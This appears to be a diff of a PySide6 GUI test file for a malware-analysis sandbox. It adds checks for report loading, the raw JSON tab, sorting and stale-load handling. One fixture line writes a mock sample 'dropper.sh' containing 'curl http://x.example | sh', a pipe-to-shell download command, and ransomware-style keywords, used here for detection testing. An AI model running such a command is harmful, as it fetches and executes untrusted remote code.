@@ -42,7 +42,7 @@ def gui(qapp, tmp_path):
     qapp.processEvents()
 
 
-def test_mock_analysis_end_to_end_through_gui(gui, tmp_path):
+def test_mock_analysis_end_to_end_through_gui(gui, tmp_path, monkeypatch):
     app, ctx, win = gui
     sample = tmp_path / "dropper.sh"
     sample.write_text("curl http://x.example | sh\nencrypt decrypt .locked\n", encoding="utf-8")
@@ -67,18 +67,45 @@ def test_mock_analysis_end_to_end_through_gui(gui, tmp_path):
 
     win.open_report(analysis_id)
     report = win.pages["report"]
+    # until the report arrives the page shows a loading state, not the previous report
+    assert report.title.text() == f"Loading analysis #{analysis_id}..."
+    assert not report.tabs.isEnabled() and not report.export_json.isEnabled()
     assert pump(app, lambda: report.report is not None)
+    assert report.tabs.isEnabled() and report.export_pdf.isEnabled()
     assert report.report["verdict"] in ("suspicious", "malicious")
     assert report.yara_tree.topLevelItemCount() >= 2
     assert report.proc_tree.topLevelItemCount() == 1  # malware_sample -> curl
     assert report.b_model.rowCount() > 0
+    # Raw JSON is filled when its tab is first opened, without the duplicate "behaviour" list
+    assert report.raw_view.toPlainText() == ""
+    report.tabs.setCurrentWidget(report.raw_view)
+    assert pump(app, lambda: report.raw_view.toPlainText().startswith("{"))
+    assert '"events"' in report.raw_view.toPlainText() and '"behaviour"' not in report.raw_view.toPlainText()
     # guest/sample-controlled strings must never be rendered as HTML
     from PySide6.QtCore import Qt
 
     assert report.title.textFormat() == Qt.TextFormat.PlainText
     assert page.result_title.textFormat() == Qt.TextFormat.PlainText
+
+    def column(c):
+        return [report.b_proxy.index(r, c).data() for r in range(report.b_proxy.rowCount())]
+
+    times = column(0)
+    assert times == sorted(times) and len(set(times)) > 1
+    report.b_view.sortByColumn(0, Qt.SortOrder.DescendingOrder)
+    assert column(0) == sorted(times, reverse=True)
+    report.b_view.sortByColumn(1, Qt.SortOrder.AscendingOrder)
+    assert column(1) == sorted(column(1))
     report.b_type.setCurrentText("network")
     assert 0 < report.b_proxy.rowCount() < report.b_model.rowCount()
+
+    # a slow load that is no longer the one requested is dropped
+    warnings = []
+    monkeypatch.setattr(QtWidgets.QMessageBox, "warning", lambda *a: warnings.append(a[2]))
+    report.load(analysis_id)
+    report.load(analysis_id + 1000)
+    assert pump(app, lambda: warnings == ["That analysis no longer exists."])
+    assert not pump(app, lambda: report.report is not None, timeout=1)
 
 
 def test_vms_rules_and_settings_pages(gui):
